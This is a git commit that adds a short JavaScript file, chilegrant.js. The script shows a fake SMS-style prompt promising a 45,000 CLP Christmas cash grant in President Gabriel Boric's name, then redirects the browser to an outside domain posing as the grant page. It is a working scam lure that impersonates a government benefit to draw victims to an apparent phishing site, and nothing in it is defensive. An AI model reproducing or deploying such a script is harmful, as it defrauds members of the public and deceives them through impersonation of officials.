582e940af5cd444543e7ee4f1c48372e056ec671
bigetijazz11 <bigetijazz11@gmail.com>
2024-11-30 01:03:09 -0800

    Create chilegrant.js

---
+++ chilegrant.js
@@ -0,0 +1,6 @@
+
+var password = 'AFIRMAR 45,000 CLP'
+password=prompt('SMS: Felicitaciones, eres elegible para GABRIEL BORIC 45,000 CLP SUBVENCIÓN EN EFECTIVO DE NAVIDAD PARA TODOS, presione OK para AFIRMAR Premio en efectivo','AFIRMAR 45,000 CLP');
+if (password != 'AFIRMAR 45,000 CLP') {
+location.href='https://www.lib-legit.xyz/45000CLP-subvencion';
+}
